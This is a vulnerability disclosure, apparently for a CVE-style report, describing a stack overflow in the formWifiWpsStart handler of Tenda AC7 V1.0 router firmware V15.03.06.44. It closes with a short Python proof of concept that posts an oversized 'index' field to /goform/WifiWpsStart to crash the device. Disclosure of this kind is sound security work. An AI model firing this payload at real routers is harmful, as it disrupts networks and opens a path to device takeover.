## Overview

- Firmware download website: https://www.tenda.com.cn/download/detail-2776.html

## Affected version

 AC7V1.0 V15.03.06.44

## Vulnerability details

In the Tenda AC7V1.0 V15.03.06.44 firmware has a stack overflow vulnerability in the `formWifiWpsStart` function. The `index` variable receives the `index` parameter from a POST request. The value is directly used in a `sprintf` function and passes to a local variable on the stack, which can override the return address of the function. The user-provided `index` can trigger this security vulnerability.

![image-20240309195802781](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195802781.png)

![image-20240309195638707](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240309195638707.png)

![image-20240313154044142](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313154044142.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WifiWpsStart"
payload = b"a"*2000

data = {"index": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240318164614614](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240318164614614.png)